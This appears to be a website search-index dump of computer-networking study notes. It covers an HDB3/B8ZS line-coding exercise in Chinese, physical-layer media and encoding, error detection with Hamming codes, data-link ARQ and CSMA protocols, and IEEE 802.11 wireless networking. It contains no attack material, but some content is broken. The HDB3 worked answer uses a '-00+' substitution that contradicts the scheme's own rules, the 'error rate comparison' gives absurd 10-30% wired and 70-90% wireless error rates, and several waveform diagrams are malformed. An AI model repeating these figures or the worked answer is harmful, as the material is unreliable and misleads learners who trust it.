\u6781\u6027\u4e0e\u524d\u4e00\u4e2a\u975e\u96f6\u8109\u51b2\u76f8\u53cd\u3002</li> <li>\u66ff\u6362\u7b56\u7565\uff1a</li> <li>\u5947\u6570\uff1a<code>0000</code> \u66ff\u6362\u4e3a <code>000V</code></li> <li>\u5076\u6570\uff1a<code>0000</code> \u66ff\u6362\u4e3a <code>B00V</code></li> </ul> </li> </ul> <p>\u521d\u59cb\u6761\u4ef6\u5206\u6790\uff1a</p> <ul> <li>\u201cassume an odd number of +/- parity bits observed at the beginning...\u201d \u610f\u5473\u7740 HDB3 \u7684\u7b2c\u4e00\u6b21\u66ff\u6362\u4ece\u201c\u5947\u6570\u4e2a\u975e\u96f6\u8109\u51b2\u201d\u72b6\u6001\u5f00\u59cb\u3002</li> <li>\u201cthe last voltage we observed was negative\u201d \u610f\u5473\u7740\u4e0b\u4e00\u4e2a <code>1</code> \u5e94\u7f16\u7801\u4e3a <code>+</code>\u3002</li> </ul> <p>\u7ed9\u5b9a\u6570\u636e\uff1a</p> <p><code>000010000000010110000</code></p>"},{"location":"cs/network/w11/#a-b8zs","title":"A. B8ZS \u7f16\u7801","text":"<ul> <li>\u521d\u59cb\u72b6\u6001\uff1a<code>last_pulse_polarity = -V</code>\uff0c\u4e0b\u4e00\u4e2a <code>1</code> \u7f16\u7801\u4e3a <code>+</code></li> <li>\u9010\u6b65\u7f16\u7801\u5982\u4e0b\uff1a</li> </ul> <ol> <li><code>0000</code>\uff1a\u6b63\u5e38\u7f16\u7801 <code>0 0 0 0</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>+</code></li> <li><code>00000000</code>\uff088 \u4e2a 0\uff09\uff1a\u524d\u4e00\u4e2a\u8109\u51b2\u4e3a <code>+</code>\uff0c\u66ff\u6362\u4e3a <code>000+-0-+</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>-</code></li> <li><code>0</code>\uff1a\u7f16\u7801\u4e3a <code>0</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>+</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>-</code></li> <li><code>0000</code>\uff1a\u6b63\u5e38\u7f16\u7801 <code>0 0 0 0</code></li> </ol> <p>B8ZS \u6700\u7ec8\u7ed3\u679c\uff1a</p> <pre><code>0 0 0 0 + 0 0 0 + - 0 - + - 0 + - 0 0 0 0\n</code></pre>"},{"location":"cs/network/w11/#b-hdb3","title":"B. HDB3 \u7f16\u7801","text":"<ul> <li>\u521d\u59cb\u72b6\u6001\uff1a<code>last_pulse_polarity = -V</code>\uff0c\u5947\u6570\u4e2a\u975e\u96f6\u8109\u51b2</li> <li>\u9010\u6b65\u7f16\u7801\u5982\u4e0b\uff1a</li> </ul> <ol> <li><code>0000</code>\uff1a\u5947\u6570\uff0c\u66ff\u6362\u4e3a <code>000-</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>+</code></li> <li><code>0000</code>\uff1a\u5076\u6570\uff0c\u66ff\u6362\u4e3a <code>- 0 0 +</code></li> <li><code>0000</code>\uff1a\u5076\u6570\uff0c\u66ff\u6362\u4e3a <code>- 0 0 +</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>-</code></li> <li><code>0</code>\uff1a\u7f16\u7801\u4e3a <code>0</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>+</code></li> <li><code>1</code>\uff1a\u7f16\u7801\u4e3a <code>-</code></li> <li><code>0000</code>\uff1a\u5947\u6570\uff0c\u66ff\u6362\u4e3a <code>000-</code></li> </ol> <p>HDB3 \u6700\u7ec8\u7ed3\u679c\uff1a</p> <pre><code>0 0 0 - + - 0 0 + - 0 0 + - 0 + - 0 0 0 -\n</code></pre>"},{"location":"cs/network/w2/","title":"2.0 Physical Layer","text":"<p>The Physical Layer is the lowest layer in the OSI model responsible for transmitting a raw bit stream over the physical communication medium. It handles the electrical and mechanical interfaces between data and the physical medium, distinct from higher layers which interact through defined interfaces.</p>"},{"location":"cs/network/w2/#transmission-media","title":"Transmission Media","text":"<p>Various transmission media carry data signals physically, each with distinct characteristics affecting network performance.</p> Medium Type Cost Speed Range Distance Limit EMI Resistance Installation UTP Cable Low 10 Mbps - 10 Gbps 100m Poor Simple STP Cable Medium Higher than UTP &gt;100m Good Medium Coaxial Medium 10 Mbps - 1 Gbps 500m Fair Medium Optical Fiber High Gbps - Tbps &gt;100 km Excellent Complex Wireless Low-Medium Variable Variable Poor Simple"},{"location":"cs/network/w2/#unshielded-twisted-pair-utp-cable","title":"Unshielded Twisted Pair (UTP) Cable","text":"<p>Low-cost network cable with insulated conductors twisted together and covered with a plastic jacket. Widely used in Local Area Networks (LANs). Susceptible to electromagnetic interference. Has limits on cable length (e.g., 100m for 10Base-T) and number of taps due to signal decay.</p>"},{"location":"cs/network/w2/#shielded-twisted-pair-stp-cable","title":"Shielded Twisted Pair (STP) Cable","text":"<p>Similar to UTP but includes an extra foil wrapping or copper braid jacket for electromagnetic interference shielding. STP cables are costlier than UTP but can support higher transmission rates over longer distances.</p>"},{"location":"cs/network/w2/#coaxial-cable","title":"Coaxial Cable","text":"<p>Used for television connections and original Ethernet. Includes baseband (digital signaling, used by original Ethernet) and broadband (analog signaling) types.</p>"},{"location":"cs/network/w2/#optical-fibre","title":"Optical Fibre","text":"<p>Transmits data using light signals based on total internal reflection. Offers very high speed and long distances without needing repeaters (e.g., over 100 km for single-mode fiber). Single-mode fiber is expensive but can handle gigabits per second data rates. Requires conversion of bits into light signals.</p>"},{"location":"cs/network/w2/#radiowireless-microwave-satellite-cellular","title":"Radio/Wireless (Microwave, Satellite, Cellular)","text":"<p>Uses air or space as the medium. Offers mobility but is susceptible to interference (signal interference, rain, atmospheric conditions, objects in the path), reflections, diffractions, and multi-path fading. Wireless networks are often slower and have less transfer rate compared to wired networks due to these factors. Different frequency bands are used, some licensed (like cellular networks) and some license-free (like the ISM band used by Wi-Fi and Bluetooth).</p>"},{"location":"cs/network/w2/#basic-network-measurements","title":"Basic Network Measurements","text":"<p>Understanding network performance is crucial for system design and troubleshooting.</p> Metric Definition Units Typical Values Affects Latency Time for first bit to travel ms LAN: &lt;1ms, WAN: 10-100ms Response time Bandwidth Theoretical maximum rate bps 10M-100G Capacity Throughput Actual achieved rate bps 60-80% of bandwidth Real performance RTT Round-trip time ms 2x latency + processing Protocol timers"},{"location":"cs/network/w2/#latency","title":"Latency","text":"<p>The amount of time it takes for the first bit of data to reach the destination. Also referred to as propagation delay.</p>"},{"location":"cs/network/w2/#bandwidth","title":"Bandwidth","text":"<p>The data transfer rate, indicating the number of bits that can be passed through a network connection. Conceptually related to the width of a pipe for water flow. Historically related to the frequency range within the medium (higher frequency potentially allowing for higher data transfer rate). Note the distinction between advertised bandwidth (what is sold) and actual throughput (what is achieved).</p>"},{"location":"cs/network/w2/#throughput","title":"Throughput","text":"<p>The actual achieved transfer rate of data. Often less than the theoretical bandwidth due to various factors.</p>"},{"location":"cs/network/w2/#round-trip-time-rtt","title":"Round Trip Time (RTT)","text":"<p>The time it takes for a signal or packet to go from source to destination and back. Influences network performance and protocol design (e.g., timeout intervals for retransmission).</p>"},{"location":"cs/network/w2/#encoding","title":"Encoding","text":"<p>Encoding in the Physical Layer refers to how binary bits (0s and 1s) are represented as signals for transmission over the physical medium (e.g., electrical signals, light pulses). The choice of encoding scheme can affect performance, help break problematic signal sequences, and aid in error detection.</p> Encoding Type Signal Levels DC Component Clock Recovery Bandwidth Efficiency Common Issues NRZ-L 2 (0V, +V) Yes Poor Good Long runs AMI 3 (-V, 0, +V) No Fair Good Long zeros Manchester 2 (-V, +V) No Excellent Poor (2x bandwidth) None Diff. Manchester 2 (-V, +V) No Excellent Poor (2x bandwidth) Complex"},{"location":"cs/network/w2/#nrz-l-non-return-to-zero-level","title":"NRZ-L (Non-Return-to-Zero Level)","text":"<p>A basic digital encoding scheme where the signal level corresponds directly to the bit value (e.g., high voltage for 1, low voltage for 0). Can suffer from problems with long sequences of the same bit (no transitions, making clock recovery difficult) and potential DC component issues.</p>"},{"location":"cs/network/w2/#ami-alternate-mark-inversion","title":"AMI (Alternate Mark Inversion)","text":"<p>A bipolar encoding scheme where 'mark' (typically a 1 bit) is represented by alternating positive and negative pulses, while 0 is represented by zero voltage. Helps eliminate the DC component but still has issues with long sequences of 0s.</p>"},{"location":"cs/network/w2/#manchester-encoding","title":"Manchester Encoding","text":"<p>A phase encoding scheme used in Ethernet (IEEE 802.3). A transition occurs in the middle of each bit period. The direction of the transition represents the bit value (e.g., low-to-high for 1, high-to-low for 0). Provides a clocking mechanism within the data stream (self-clocking).</p>"},{"location":"cs/network/w2/#differential-manchester-encoding","title":"Differential Manchester Encoding","text":"<p>Similar to Manchester but uses the presence or absence of a transition at the beginning of the bit period to represent 0 or 1, respectively. A transition always occurs in the middle for clocking.</p>"},{"location":"cs/network/w2/#scrambling-techniques-b8zs-hdb3","title":"Scrambling Techniques (B8ZS, HDB3)","text":"<p>Used to address the problem of long sequences of 0s in AMI or other unipolar/bipolar schemes. These techniques replace sequences of zeros with specific patterns that include intentional voltage violations (violations of the AMI alternation rule).</p>"},{"location":"cs/network/w2/#b8zs-bipolar-8-zero-substitution","title":"B8ZS (Bipolar 8-Zero Substitution)","text":"<p>Replaces sequences of eight consecutive zeros with a specific pattern of pulses, including voltage violations. The pattern depends on the polarity of the last non-zero pulse preceding the sequence.</p>"},{"location":"cs/network/w2/#hdb3-high-density-bipolar-3-zero-code","title":"HDB3 (High-Density Bipolar 3-Zero Code)","text":"<p>Replaces sequences of four consecutive zeros with a specific pattern, also including voltage violations. The pattern depends on the polarity of the last non-zero pulse and the parity of the number of non-zero pulses since the last substitution. These violations help the receiver maintain synchronization.</p>"},{"location":"cs/network/w2/#error-detection-and-correction","title":"Error Detection and Correction","text":"<p>Errors can occur during transmission due to noise or other channel impairments. Error detection allows the receiver to determine if an error has occurred. Error correction allows the receiver to not only detect but also fix certain errors without retransmission.</p> Method Type Overhead Error Detection Error Correction Complexity Checksum Detection Low Single-bit, some multi-bit None Low CRC Detection Medium Excellent burst detection None Medium Hamming Code Detection + Correction High 2-bit detection 1-bit correction High"},{"location":"cs/network/w2/#need-for-error-handling","title":"Need for Error Handling","text":"<p>The receiver simply receives a stream of bits. Without error detection, the receiver cannot know if the received bits are the same as what was sent, especially in noisy channels.</p>"},{"location":"cs/network/w2/#error-detection-methods","title":"Error Detection Methods","text":""},{"location":"cs/network/w2/#checksum","title":"Checksum","text":"<p>A mathematical method used for error detection. A sum is calculated over the data (or header) bits at the sender and appended to the message. The receiver performs the same calculation and compares it to the received checksum. Often used specifically for IP header integrity (Header Checksum). The UDP protocol also includes an optional checksum over the UDP header and data. The basic addition-based checksum can detect single-bit errors but not all two-bit errors.</p>"},{"location":"cs/network/w2/#cyclic-redundancy-check-crc","title":"Cyclic Redundancy Check (CRC)","text":"<p>A more powerful error detection method based on polynomial division. A CRC value is calculated over the data bits at the sender using a predefined polynomial and appended as a trailer. The receiver performs the same calculation over the received data and trailer; if the result is zero (or matches an expected value), it indicates no error. CRCs are generally more effective at detecting burst errors than simple checksums.</p>"},{"location":"cs/network/w2/#error-detection-and-correction-methods","title":"Error Detection and Correction Methods","text":""},{"location":"cs/network/w2/#hamming-code","title":"Hamming Code","text":"<p>A technique capable of detecting and correcting single-bit errors, and detecting (but not correcting) certain multi-bit errors.</p>"},{"location":"cs/network/w2/#principle","title":"Principle","text":"<p>Adds redundant bits (called parity or control bits) to the original data bits. These parity bits are calculated based on specific groups of data bits.</p>"},{"location":"cs/network/w2/#number-of-redundant-bits","title":"Number of Redundant Bits","text":"<p>For a message of <code>m</code> data bits, the minimum number of redundant bits <code>p</code> required can be found using the formula: 2^p \u2265 p + m + 1. For example, with m=11 data bits, you need p=4 redundant bits (2^4=16 \u2265 4+11+1=16).</p>"},{"location":"cs/network/w2/#location-of-redundant-bits","title":"Location of Redundant Bits","text":"<p>The parity bits are placed at positions that are powers of 2 (positions 1, 2, 4, 8, 16, ...) within the complete codeword (data + parity bits). The remaining positions are for the original data bits.</p>"},{"location":"cs/network/w2/#calculation-evenodd-parity","title":"Calculation (Even/Odd Parity)","text":"<p>For even parity (common method), each parity bit is calculated so that the total number of 1s in its corresponding group of bits (including the parity bit itself) is even. The groups of bits checked by each parity bit are determined by their binary position; for example, parity bit at position 1 (0001) checks all positions where the least significant bit is 1 (1, 3, 5, 7, 9, 11, ...), parity bit at position 2 (0010) checks positions where the second bit is 1 (2, 3, 6, 7, 10, 11, ...), and so on.</p>"},{"location":"cs/network/w2/#checking-and-correcting-errors","title":"Checking and Correcting Errors","text":"<p>At the receiver, the parity bits are recalculated based on the received data using the same grouping logic. If all recalculated parity bits match the received parity bits, there is likely no single-bit error. If they don't match, the positions of the incorrect parity bits form a binary number that indicates the exact position of the corrupted bit in the received codeword, allowing it to be flipped (corrected). For example, if parity check 1 (position 1) and parity check 4 (position 4) fail, and check 2 (position 2) succeeds, the error is at position 1+4=5.</p>"},{"location":"cs/network/w2/#comparative-analysis-and-examples","title":"Comparative Analysis and Examples","text":""},{"location":"cs/network/w2/#key-relationships-between-physical-layer-concepts","title":"Key Relationships Between Physical Layer Concepts","text":"Concept Category Primary Goal Trade-offs Real-world Impact Transmission Media Signal transport Cost vs Performance vs Distance Infrastructure decisions Network Measurements Performance quantification Accuracy vs Overhead QoS requirements Encoding Schemes Bit representation Efficiency vs Reliability Protocol compatibility Error Handling Data integrity Overhead vs Protection Application reliability"},{"location":"cs/network/w2/#example-calculation-propagation-delay","title":"Example Calculation: Propagation Delay","text":"<p>Problem: Calculate one-way propagation delay for a 100 km fiber optic link where signal travels at 2\u00d710^8 m/s.</p> <p>Solution Steps:</p> <pre><code>Given:\n- Distance (d) = 100 km = 100,000 m\n- Signal speed (v) = 2\u00d710^8 m/s\n\nFormula: Propagation Delay = Distance / Speed\n\nCalculation:\nPropagation Delay = 100,000 m / (2\u00d710^8 m/s)\n                  = 100,000 / 200,000,000\n                  = 0.0005 s\n                  = 0.5 ms\n</code></pre> Parameter Value Unit Distance 100 km Signal Speed 2\u00d710^8 m/s Propagation Delay 0.5 ms"},{"location":"cs/network/w2/#example-calculation-hamming-code-redundant-bits","title":"Example Calculation: Hamming Code Redundant Bits","text":"<p>Problem: Determine minimum number of parity bits needed for 11 data bits using Hamming code.</p> <p>Solution Steps:</p> <pre><code>Formula: 2^p \u2265 p + m + 1\nWhere: p = parity bits, m = data bits = 11\n\nTesting values:\n</code></pre> p (parity bits) 2^p p + m + 1 2^p \u2265 (p + m + 1)? Result 1 2 1 + 11 + 1 = 13 2 \u2265 13? No 2 4 2 + 11 + 1 = 14 4 \u2265 14? No 3 8 3 + 11 + 1 = 15 8 \u2265 15? No 4 16 4 + 11 + 1 = 16 16 \u2265 16? Yes <p>Answer: Minimum 4 parity bits required for 11 data bits.</p>"},{"location":"cs/network/w2/#encoding-scheme-comparison-visualization","title":"Encoding Scheme Comparison Visualization","text":"<p>Data Sequence Example: 1011</p> <pre><code>Bit Period:     |  1  |  0  |  1  |  1  |\n\nNRZ-L:         ____      ________\n               |   |    |\n               |   |____|\n               +V  0V   \n\nAMI:           ____           ____\n               |   |         |   \n               |   |_________|   \n               +V  0V        -V  \n\nManchester:    __    __    __    __\n               | |  | |   | |  | |\n               | |__| |___| |__| |\n               (\u2191=1, \u2193=0 transitions)\n</code></pre> <p>These concepts form the core foundation of Physical Layer understanding for network communications, emphasizing the relationships between medium characteristics, performance metrics, signal encoding, and error management strategies.</p>"},{"location":"cs/network/w3/","title":"3.0 Data Link Layer","text":""},{"location":"cs/network/w3/#overview-and-position-in-osi-model","title":"Overview and Position in OSI Model","text":"<p>The Data Link Layer is the second layer in the OSI model, situated above the Physical Layer and below the Network Layer. Its primary responsibility is to get packets from one hop to the next across a single network link. It takes the raw bit stream from the Physical Layer and transforms it into frames.</p>"},{"location":"cs/network/w3/#core-functions-of-the-data-link-layer","title":"Core Functions of the Data Link Layer","text":"Function Purpose Key Mechanisms Framing Bundle bits into logical units (frames) Flag, Header, Data Payload, Trailer Flow Control Regulate transmission rate between sender/receiver Receiver signaling, Window management Error Control Detect and correct transmission errors Error detection codes, Retransmissions Access Control Manage shared medium access CSMA, Collision detection/avoidance"},{"location":"cs/network/w3/#framing-details","title":"Framing Details","text":"<ul> <li>Purpose: Ensure reliable transmission and perform limited error detection/recovery within the link</li> <li>Frame Structure:</li> <li>Flag: Marking the start and end</li> <li>Header: Control information like addresses (MAC addresses)</li> <li>Data Payload: From the upper layer</li> <li>Trailer: Error detection/correction codes</li> <li>Addressing: Uses MAC addresses (Physical Addresses) to identify devices within the local network</li> </ul>"},{"location":"cs/network/w3/#automatic-repeat-request-arq-protocols","title":"Automatic Repeat reQuest (ARQ) Protocols","text":"<p>ARQ protocols handle transmission errors and control flow through acknowledgements and retransmissions.</p>"},{"location":"cs/network/w3/#protocol-comparison-table","title":"Protocol Comparison Table","text":"Protocol Type Window Size Error Handling Performance Complexity Stop-and-Wait ARQ 1 frame Retransmit on timeout/NAK Low (waiting overhead) Simple Go-Back-N N frames Retransmit lost frame + all subsequent Medium (bulk retransmission) Medium Selective Repeat N frames Retransmit only lost frames High (selective retransmission) Complex"},{"location":"cs/network/w3/#stop-and-wait-arq","title":"Stop-and-Wait ARQ","text":"<ul> <li>Sender transmits one frame and waits for acknowledgement (ACK)</li> <li>Only after receiving positive ACK does sender transmit next frame</li> <li>If frame or ACK is lost/corrupted, sender retransmits after timeout</li> <li>Provides implicit flow control</li> </ul>"},{"location":"cs/network/w3/#sliding-window-protocols","title":"Sliding Window Protocols","text":"<p>Both Go-Back-N and Selective Repeat allow multiple frames transmission within a \"window\" before waiting for acknowledgements. They manage synchronization under conditions of premature timeouts, garbled frames, and lost frames.</p>"},{"location":"cs/network/w3/#go-back-n-protocol","title":"Go-Back-N Protocol","text":"<ul> <li>Error Response: Receiver discards lost/erroneous frame AND all subsequent frames</li> <li>Sender Action: Retransmits lost frame and all frames sent after it within current window</li> <li>Window Impact: Larger window = more frames to retransmit on error</li> </ul>"},{"location":"cs/network/w3/#selective-repeat-protocol","title":"Selective Repeat Protocol","text":"<ul> <li>Error Response: Receiver discards only the specific bad frame, buffers subsequent correct frames</li> <li>Sender Action: Retransmits ONLY the lost frame</li> <li>Window Impact: Larger window = more buffering required at receiver</li> </ul>"},{"location":"cs/network/w3/#performance-calculation-example","title":"Performance Calculation Example","text":"<p>Scenario: 1000-byte frames, 1 Mbps link, 10ms propagation delay, 0.1% frame error rate</p> <p>Stop-and-Wait Efficiency: * Transmission time (Tt) = 1000 \u00d7 8 / 1, 000, 000 = 8ms * Round-trip time (RTT) = 2 \u00d7 10ms = 20ms * Total time per frame = Tt + RTT = 28ms * Efficiency = Tt / (Tt + RTT) = 8/28 = 28.6%</p> <p>Go-Back-N with Window Size 7: * Can send 7 frames before waiting for ACK * If error occurs at frame 4, must retransmit frames 4-7 * Efficiency improves but decreases with error rate</p>"},{"location":"cs/network/w3/#access-control-protocols","title":"Access Control Protocols","text":"<p>These protocols determine how multiple stations access a shared medium without interference.</p>"},{"location":"cs/network/w3/#protocol-comparison-and-evolution","title":"Protocol Comparison and Evolution","text":"Protocol Environment Collision Strategy Detection Method Recovery Mechanism CSMA Any Listen before transmit Carrier sensing Defer transmission CSMA/CD Wired (Ethernet) Detect during transmission Simultaneous monitoring Stop + random backoff CSMA/CA Wireless (802.11) Avoid before transmission RTS/CTS control frames Backoff + retry"},{"location":"cs/network/w3/#protocol-details","title":"Protocol Details","text":""},{"location":"cs/network/w3/#carrier-sense-multiple-access-csma","title":"Carrier Sense Multiple Access (CSMA)","text":"<ul> <li>Stations listen (sense carrier) to channel before transmitting</li> <li>If channel busy, defer transmission</li> <li>Limitation: Cannot detect collisions during transmission</li> </ul>"},{"location":"cs/network/w3/#csma-with-collision-detection-csmacd","title":"CSMA with Collision Detection (CSMA/CD)","text":"<ul> <li>Usage: Wired Ethernet networks</li> <li>Process: Sense channel \u2192 Transmit if free \u2192 Simultaneously listen for collisions</li> <li>On Collision: Stop transmitting + back off for random period + reattempt</li> <li>Advantage: Quick collision detection and recovery</li> </ul>"},{"location":"cs/network/w3/#csma-with-collision-avoidance-csmaca","title":"CSMA with Collision Avoidance (CSMA/CA)","text":"<ul> <li>Usage: Wireless networks (IEEE 802.11)</li> <li>Reason: Collision detection difficult in wireless environments</li> <li>Method: Use control frames (RTS/CTS) to avoid collisions before transmitting</li> <li>Process: Back off after busy channel or perceived collision</li> </ul>"},{"location":"cs/network/w3/#collision-domain-analysis-example","title":"Collision Domain Analysis Example","text":"<p>Scenario: 10 stations on shared Ethernet segment</p> <p>Without Switches (Single Collision Domain): * All 10 stations compete for same medium * Higher collision probability as traffic increases * Performance degrades with more active stations</p> <p>With Switch (Separate Collision Domains): * Each port creates separate collision domain * Station-to-switch links become point-to-point * Eliminates collisions between different ports</p>"},{"location":"cs/network/w3/#data-link-layer-architecture","title":"Data Link Layer Architecture","text":""},{"location":"cs/network/w3/#sublayer-organization","title":"Sublayer Organization","text":"Sublayer Primary Functions Key Protocols/Standards Logical Link Control (LLC) Flow control, Error control Stop-and-Wait, Go-Back-N, Selective Repeat Media Access Control (MAC) Channel access management CSMA/CD, CSMA/CA, Token Ring <p>The Data Link Layer is divided into two conceptual sublayers: * Logical Link Control (LLC): Handles flow control and error control functions * Media Access Control (MAC): Manages station access to shared communication channel</p>"},{"location":"cs/network/w3/#protocol-complexity-levels","title":"Protocol Complexity Levels","text":""},{"location":"cs/network/w3/#service-type-classification","title":"Service Type Classification","text":"Complexity Level Direction Connection Acknowledgment Error Handling Use Cases Simplex Connectionless One-way None None Upper layer Simple sensors, broadcasts Half-Duplex Connectionless Two-way alternating None Per frame Timeout + retransmission Point-to-point links Full-Duplex Connection-Oriented Simultaneous two-way Established Sequence-based In-order delivery Reliable data transfer"},{"location":"cs/network/w3/#detailed-service-descriptions","title":"Detailed Service Descriptions","text":""},{"location":"cs/network/w3/#simplex-connectionless","title":"Simplex Connectionless","text":"<ul> <li>Data Flow: Only in one direction</li> <li>Acknowledgment: Sender sends frames without waiting for ACKs</li> <li>Error Handling: No error handling by this layer (delegated to upper layers)</li> </ul>"},{"location":"cs/network/w3/#half-duplex-connectionless-acknowledged-connectionless","title":"Half-Duplex Connectionless (Acknowledged Connectionless)","text":"<ul> <li>Data Flow: Both directions but only one at a time (half-duplex)</li> <li>Acknowledgment: Each frame is acknowledged</li> <li>Error Handling: Uses timeouts and retransmissions for lost/garbled frames</li> </ul>"},{"location":"cs/network/w3/#full-duplex-connection-oriented-acknowledged-connected-service","title":"Full-Duplex Connection-Oriented (Acknowledged Connected Service)","text":"<ul> <li>Data Flow: Both directions simultaneously (full-duplex)</li> <li>Connection: Logical connection is established</li> <li>Reliability: Frames are numbered and delivered reliably in order</li> </ul>"},{"location":"cs/network/w3/#conceptual-example-university-network-scenario","title":"Conceptual Example: University Network Scenario","text":""},{"location":"cs/network/w3/#problem-setup","title":"Problem Setup","text":"<p>A university has 3 buildings connected via Ethernet switches, with wireless access points in each building.</p> <p>Network Components: * Building A: 50 wired stations + 1 wireless AP (30 wireless clients) * Building B: 30 wired stations + 1 wireless AP (20 wireless clients) * Building C: 20 wired stations + 1 wireless AP (15 wireless clients)</p>"},{"location":"cs/network/w3/#data-link-layer-analysis","title":"Data Link Layer Analysis","text":"<p>Wired Network (CSMA/CD): * Each switch port = separate collision domain * No collisions between buildings (switched infrastructure) * Full-duplex links between switches</p> <p>Wireless Network (CSMA/CA): * Each AP creates one collision domain for its wireless clients * RTS/CTS mechanism for hidden terminal problem * Half-duplex shared medium within each wireless cell</p> <p>Frame Processing Example:</p> <pre><code>Station A1 \u2192 Station B5:\n1. A1 creates frame with MAC addresses (A1_MAC \u2192 B5_MAC)\n2. Frame sent to Switch A via CSMA/CD\n3. Switch A learns A1_MAC location, forwards to Building B\n4. Switch B delivers frame to B5 port\n5. B5 receives frame, sends ACK back through same path\n</code></pre> <p>Performance Calculation: * Wired throughput: Near line rate (minimal collisions) * Wireless throughput: ~50% of nominal rate (CSMA/CA overhead) * Inter-building latency: Switch processing + propagation delay</p>"},{"location":"cs/network/w4/","title":"4.0 Wireless Networking","text":""},{"location":"cs/network/w4/#wireless-networking-challenges","title":"Wireless Networking Challenges","text":""},{"location":"cs/network/w4/#core-challenge-categories","title":"Core Challenge Categories","text":"Challenge Type Specific Issues Impact on Network Design Physical Signal Issues Attenuation (rain, water, dust) Higher error rates, need for error correction Reflections (water bodies, fog) Signal distortion, multipath effects Diffractions (hills, buildings) Coverage gaps, dead zones Infrastructure Constraints Antenna icing Service interruption, maintenance requirements Zoning restrictions Limited transmission power, reduced coverage Device Limitations Power consumption (especially IoT) Battery life considerations, sleep modes Security Vulnerabilities Wide signal propagation Open to eavesdropping, need for encryption"},{"location":"cs/network/w4/#error-rate-comparison","title":"Error Rate Comparison","text":"<pre><code>Wired Networks:    [Low Error Rate]     \u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591 (10-30%)\nWireless Networks: [Higher Error Rate]  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591 (70-90%)\n</code></pre>"},{"location":"cs/network/w4/#ieee-80211-wlan-architecture","title":"IEEE 802.11 (WLAN) Architecture","text":""},{"location":"cs/network/w4/#wlan-design-goals-and-trade-offs","title":"WLAN Design Goals and Trade-offs","text":"Goal Benefit Trade-off/Challenge Ease of use Simple setup and roaming Potential security vulnerabilities Power efficiency Extended battery life May limit transmission power/range License-free operation No regulatory costs Interference from other devices Robustness to noise Reliable communication Complex error correction needed Global usability Universal deployment Different regional regulations Security Protected communications Performance overhead"},{"location":"cs/network/w4/#security-protocol-evolution","title":"Security Protocol Evolution","text":"<pre><code>WEP (Weak) \u2192 WPA \u2192 WPA2 \u2192 WPA3 (Current)\n     \u2193         \u2193      \u2193        \u2193\n   Broken   Better  Strong  Strongest\n</code></pre> <p>Note: All protocols only protect wireless links, not end-to-end communication.</p>"},{"location":"cs/network/w4/#wlan-network-types-comparison","title":"WLAN Network Types Comparison","text":"Aspect Ad Hoc (IBSS) Infrastructure Central Control None Access Point (AP) Connectivity Direct peer-to-peer All through AP Range Limitation Nodes must be in direct range Extended through AP relay Wired Network Access No Yes (via AP) Typical Duration Short-lived Permanent/Long-term Scalability Limited (small groups) High (multiple APs) Relay Capability No Yes (AP provides buffering)"},{"location":"cs/network/w4/#ieee-80211-architecture-hierarchy","title":"IEEE 802.11 Architecture Hierarchy","text":"<pre><code>Extended Service Set (ESS)\n\u251c\u2500\u2500 Basic Service Set 1 (BSS1)\n\u2502   \u251c\u2500\u2500 Access Point 1\n\u2502   \u251c\u2500\u2500 Station A\n\u2502   \u251c\u2500\u2500 Station B\n\u2502   \u2514\u2500\u2500 Station C\n\u251c\u2500\u2500 Basic Service Set 2 (BSS2)\n\u2502   \u251c\u2500\u2500 Access Point 2\n\u2502   \u251c\u2500\u2500 Station D\n\u2502   \u2514\u2500\u2500 Station E\n\u2514\u2500\u2500 Distribution System (DS)\n    \u2514\u2500\u2500 Connects all APs\n</code></pre> <p>Example: University campus network (Unifi) = ESS with multiple BSSs</p>"},{"location":"cs/network/w4/#service-classification","title":"Service Classification","text":"Service Category Specific Services Primary Function Station Services Authentication Verify device identity De-authentication Remove authenticated station Privacy Prevent eavesdropping Data delivery Transport data packets Distribution Services Association Link station to AP Mobility management Handle roaming between APs Integration Connect to other network types"},{"location":"cs/network/w4/#medium-access-control-mac-key-differences","title":"Medium Access Control (MAC) - Key Differences","text":"Protocol Detection Method Timing Use Case Ethernet CSMA/CD Collision Detection AFTER collision occurs Wired networks Wireless CSMA/CA Collision Avoidance BEFORE transmission Wireless networks"},{"location":"cs/network/w4/#rtscts-mechanism-visualization","title":"RTS/CTS Mechanism Visualization","text":"<p>Scenario: Station A wants to send data to Station B</p> <pre><code>Step 1: Station A broadcasts RTS\nA ----[RTS]----&gt; B\n  \\             /\n   \\           /\n    v         v\n    C         D\n(hears RTS,  (hears RTS,\n defers)      defers)\n\nStep 2: Station B responds with CTS\nA &lt;---[CTS]----- B\n  ^             ^\n   \\           /\n    \\         /\n    C         D\n(hears CTS,  (hears CTS,\n defers)      defers)\n\nStep 3: Data transmission\nA =====[DATA]===&gt; B\n(Other stations remain silent)\n</code></pre>"},{"location":"cs/network/w4/#binary-exponential-backoff-calculation-example","title":"Binary Exponential Backoff Calculation Example","text":"<p>Problem: Station fails to receive CTS after sending RTS. Calculate backoff time.</p> Attempt Backoff Window Random Slots Wait Time (if slot = 20\u03bcs) 1st 0 to 2^1-1 = [0, 1] Random(0, 1) 0\u03bcs or 20\u03bcs 2nd 0 to 2^2-1 = [0, 3] Random(0, 3) 0\u03bcs, 20\u03bcs, 40\u03bcs, or 60\u03bcs 3rd 0 to 2^3-1 = [0, 7] Random(0, 7) 0\u03bcs to 140\u03bcs nth 0 to 2^n-1 Random(0, 2^n-1) Exponentially increasing"},{"location":"cs/network/w4/#full-duplex-analysis","title":"Full Duplex Analysis","text":"Configuration Simultaneous TX/RX Collision Risk Implementation Single Channel Impossible High Standard CSMA/CA Multiple Channels Possible Low Separate TX/RX channels Advanced Techniques Limited Medium Interference cancellation"},{"location":"cs/network/w4/#80211-standards-performance-comparison","title":"802.11 Standards Performance Comparison","text":"Standard Max Bandwidth Frequency Real-world Performance 802.11b 11 Mbps 2.4 GHz ~5-6 Mbps 802.11g 54 Mbps 2.4 GHz ~25-30 Mbps 802.11n 100+ Mbps 2.4/5 GHz ~50-70 Mbps <p>Performance Degradation Factors: * Interference and fading * Distance from AP * Number of concurrent users * Environmental 